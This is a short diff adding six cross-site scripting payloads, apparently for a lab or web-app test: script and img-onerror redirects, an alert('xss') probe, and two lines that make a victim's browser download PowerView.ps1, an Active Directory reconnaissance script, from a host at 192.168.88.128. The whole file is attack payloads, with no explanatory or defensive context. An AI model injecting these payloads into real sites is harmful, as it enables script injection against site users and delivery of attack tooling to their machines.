@@ -1,0 +1,6 @@
+<script>window.location.href = 'https://www.nthu.edu.tw/';</script>
+<script>window.location.href = 'www.google.com';</script>
+<script>download('http://192.168.88.128/PowerView.ps1')
+<script>alert("xss")</script>
+<a href='http://192.168.88.128/PowerView.ps1' download='PowerView.ps1'/>
+<img src=x onerror="window.location.href('www.google.com')"/>
